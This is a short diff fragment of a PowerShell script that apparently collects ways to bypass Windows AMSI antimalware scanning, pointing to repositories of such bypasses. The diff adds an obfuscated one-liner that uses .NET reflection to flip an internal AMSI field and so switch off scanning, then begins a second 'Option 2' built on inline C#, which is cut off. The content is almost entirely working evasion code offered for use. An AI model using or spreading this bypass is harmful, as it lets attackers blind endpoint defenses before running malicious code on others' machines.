@@ -1,7 +1,11 @@
 # find more on: 
 # https://github.com/tihanyin/PSSW100AVB
 # https://github.com/Abdulrhmanbk/Bypass-AMSI-2022
-################
+################################################################
+# Option 1:
+([ref].assembly.gettypes()|?{$_.name-match'siu'}).declaredfields[2].setvalue(0,$true)
+################################################################
+# Option 2:
 
 $ABCDEFGG = @"
 using System;
